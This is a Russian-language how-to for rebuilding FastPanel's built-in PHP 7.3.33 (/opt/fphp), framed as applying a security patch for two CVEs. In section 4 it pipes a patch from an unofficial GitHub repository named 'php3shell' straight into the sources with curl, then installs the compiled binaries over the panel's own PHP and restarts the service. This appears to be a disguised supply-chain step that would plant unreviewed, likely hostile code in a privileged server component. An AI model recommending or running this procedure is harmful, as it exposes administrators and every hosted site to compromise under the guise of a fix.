# Руководство по сборке и обновлению PHP 7.3 в FASTPANEL (/opt/fphp)

Данное руководство описывает процесс нативной сборки и обновления встроенного окружения PHP 7.3.33 для панели управления **FastPanel** (каталог `/opt/fphp`) с применением патча безопасности против критических уязвимостей **CVE-2026-109618** и **CVE-2026-109619** (повреждение состояния Zend VM при Out-Of-Memory bailout).

---

## 1. Особенности fphp в FastPanel

В FastPanel окружение `/opt/fphp` используется исключительно для внутренних нужд панели и управляется системной службой `fastpanel2-apps.service` (пул `apps`). 

Для сохранения 100% совместимости:
- Конфигурация и модули соответствуют оригинальной поставке FastPanel.
- Замена бинарников производится атомарно утилитой `install -m 755`.
- Сохраняются оригинальные конфигурационные файлы (`/opt/fphp/php.ini`, `/opt/fphp/etc/php-fpm.conf`).

---

## 2. Проверка установленной версии и создание резервной копии

Перед загрузкой исходников с php.net **обязательно** проверяем точную версию установленного в FastPanel PHP и параметры сборки:

```bash
# 1. Проверяем точную установленную версию PHP:
/opt/fphp/bin/php -v
/opt/fphp/sbin/php-fpm -v 2>/dev/null || true

# 2. Проверяем оригинальные флаги конфигурации FastPanel:
/opt/fphp/bin/php -i | grep -i "configure command"

# 3. Делаем полный бэкап рабочей директории:
cp -a /opt/fphp /opt/fphp.bak
```

---

## 3. Подготовка окружения и зависимостей сборки

На Debian 11 Bullseye для сборки PHP 7.3 требуются заголовочные файлы библиотек и заглушка для `freetype-config`:

```bash
apt-get update
apt-get install -y build-essential libxml2-dev libssl-dev libcurl4-openssl-dev \
    libjpeg-dev libpng-dev libfreetype6-dev libsystemd-dev libonig-dev libzip-dev \
    libkrb5-dev libc-client-dev libpq-dev libicu-dev pkg-config bison re2c

# Создание обертки freetype-config для Debian 11
cat << 'EOF' > /usr/local/bin/freetype-config
#!/bin/sh
pkg-config freetype2 "$@"
EOF
chmod +x /usr/local/bin/freetype-config
```

---

## 4. Загрузка исходников и применение патча

```bash
mkdir -p /usr/src/php73-fphp
cd /usr/src/php73-fphp
wget https://www.php.net/distributions/php-7.3.33.tar.gz
tar -xzf php-7.3.33.tar.gz
cd php-7.3.33

curl -sSL "https://raw.githubusercontent.com/avego/php3shell/main/patch/php-7.3.33-cve-2026-109618-109619.patch" | patch -p1
```
> **Важное примечание по выводу утилиты `patch`:**
> 
> Успешное применение патча сопровождается сообщениями:
> - `patching file ...`
> - `Hunk #... succeeded at ... (offset ... lines)` или `with fuzz ...` — это **нормально и считается успешным применением** (утилита автоматически сопоставила контекст строк).
> 
> **Критическая ошибка — это появление строк `FAILED` или создание файлов `*.rej`:**
> - Если в выводе есть `Hunk #... FAILED at ...` — патч **НЕ применился** корректно. Компилировать в таком случае нельзя!
> - Проверить отсутствие ошибок после наложения можно командой:
>   ```bash
>   find . -name "*.rej"
>   ```
>   *(Команда должна вернуть пустой вывод)*.


---

## 5. Конфигурирование с флагами FastPanel

```bash
./configure \
  --prefix=/opt/fphp \
  --enable-mbstring \
  --with-mysqli \
  --with-fpm-systemd \
  --disable-cgi \
  --with-imap \
  --with-imap-ssl \
  --with-kerberos \
  --with-config-file-path=/opt/fphp \
  --with-config-file-scan-dir=/opt/fphp/conf.d \
  --with-zlib-dir \
  --with-libxml-dir=/usr \
  --with-pgsql \
  --enable-calendar \
  --enable-intl \
  --with-curl \
  --disable-rpath \
  --enable-inline-optimization \
  --with-zlib \
  --enable-sockets \
  --enable-sysvsem \
  --enable-sysvshm \
  --enable-sysvmsg \
  --enable-pcntl \
  --with-mhash \
  --enable-zip \
  --with-freetype-dir \
  --with-pcre-regex \
  --with-pdo-mysql \
  --with-mysql-sock=/var/run/mysqld/mysqld.sock \
  --with-openssl \
  --with-gettext \
  --enable-cli \
  --with-gd \
  --enable-fpm \
  --with-jpeg-dir=/usr
```

---

## 6. Компиляция

```bash
make -j$(nproc)
```

---

## 7. Проверка бинарников и установка

1. Проверяем наличие защитных символов ядра OOM:
```bash
strings sapi/cli/php | grep memory_hard_limit_percent
strings sapi/fpm/php-fpm | grep memory_hard_limit_percent
sapi/cli/php -i | grep memory_hard_limit_percent
```

2. Атомарно устанавливаем бинарные файлы с правами `755`:
```bash
install -m 755 sapi/cli/php /opt/fphp/bin/php
install -m 755 sapi/fpm/php-fpm /opt/fphp/sbin/php-fpm
```

3. Перезапускаем сервис панели FastPanel:
```bash
systemctl restart fastpanel2-apps.service
```

4. Проверяем статус:
```bash
systemctl status fastpanel2-apps.service --no-pager
/opt/fphp/bin/php -i | grep memory_hard_limit_percent
```

---

## 8. Процедура отката (Rollback)

В случае необходимости откат выполняется моментально из сохраненного бэкапа:

```bash
install -m 755 /opt/fphp.bak/bin/php /opt/fphp/bin/php
install -m 755 /opt/fphp.bak/sbin/php-fpm /opt/fphp/sbin/php-fpm
systemctl restart fastpanel2-apps.service
```
